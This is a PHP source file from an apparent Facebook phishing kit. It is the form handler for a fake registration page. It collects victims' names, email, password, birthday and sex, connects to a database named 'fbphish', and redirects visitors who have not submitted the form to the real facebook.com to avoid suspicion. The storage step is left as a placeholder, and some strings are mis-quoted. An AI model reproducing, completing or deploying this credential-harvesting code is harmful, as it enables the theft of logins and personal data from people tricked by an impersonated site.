<?php
// Require...
require('/config.inc.php');

// Check if register form is NOT submitted
if($_POST['submit'] != "true"){
	// If register form is not submitted redirect to real facebook page
	if($config_option__287 == "true"){
		header("Location: https://facebook.com/");
		// Die() the page loading
		die();
	}elseif($config_option__287 == "false"){
		// Die() the page loading
		die();
	}elseif($config_option__287 == "home"){
		header("Location: /index.php");
		// Die() the page loading
		die();
	}else{
		header('Location: $config_option__287');
		// Die() the page loading
		die();
	}
}


// Check if register form is submitted
if(isset($_POST['submit'])){
	// Set variables
	$reg_user_ip = getIp();
	$reg_meta_user_ip = getMetaIp();
	$missing = array();

	// Check if variable is empty
	if(empty($_POST['firstname'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Firstname missing";
	}else{
		// Else set the variable
		$reg_firstname = $_POST['firstname'];
	}

	// Check if variable is empty
	if(empty($_POST['lastname'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Lastname missing";
	}else{
		// Else set the variable
		$reg_lastname = $_POST['lastname'];
	}

	// Check if variable is empty
	if(empty($_POST['reg_email__'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Email missing";
	}else{
		// Else set the variable
		$reg_email = $_POST['reg_email__'];
	}

	// Check if variable is empty
	if(empty($_POST['reg_email_confirmation__'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Email-confirmation missing";
	}else{
		// Else set the variable
		$reg_email_confirmation = $_POST['reg_email_confirmation__'];
	}

	// Check if variable is empty
	if(empty($_POST['reg_passwd__'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Password missing";
	}else{
		// Else set the variable
		$reg_passwd = $_POST['reg_passwd__'];
	}

	// Check if variable is empty
	if(empty($_POST['reg_birthday_day'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Birthday-day missing";
	}else{
		// Else set the variable
		$reg_birthday_day = $_POST['reg_birthday_day'];
	}

	// Check if variable is empty
	if(empty($_POST['reg_birthday_month'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Birthday-month missing";
	}else{
		// Else set the variable
		$reg_birthday_month = $_POST['reg_birthday_month'];
	}

	// Check if variable is empty
	if(empty($_POST['reg_birthday_year'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Birthday-year missing";
	}else{
		// Else set the variable
		$reg_birthday_year = $_POST['reg_birthday_year'];
	}

	// Check if variable is empty
	if(empty($_POST['reg_sex'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Sex missing";
	}else{
		// Else set the variable
		$reg_sex = $_POST['reg_sex'];
	}

	// Check if variable is empty
	if(empty($_POST['reg_locale'])){
		// If empty then put message in the array() "missing"
		$missing[] = "reg_locale missing";
	}else{
		// Else set the variable
		$reg_locale = $_POST['reg_locale'];
	}

	// Check if there are any missing(s) variables
	if(!empty($missing)){
		// If there are any missing(s) then make the "complete" false
		$complete = "false";
	}else{
		// If there are any missing(s) then make the "complete" true
		$complete = "true";
	}


	// DATABASE CONNECT AND INSERT





	try{
	    $fbphish_database_conn = new PDO('mysql:host=$fbphish_sql_host;dbname=$fbphish_sql_db', $fbphish_sql_user, $fbphish_sql_password);
	    // set the PDO error mode to exception
	    $fbphish_database_conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		echo "Connected successfully"; 
	}catch(PDOException $fbphish_database_conn_err){
	    echo "Connection failed: " . $fbphish_database_conn_err->getMessage();
	}






	// If complete is "true" execute code/sql
	if($complete == "true"){
		// EXECUTE PHP HERE
	}elseif($complete == "false"){
		// EXECUTE PHP HERE
	}
}


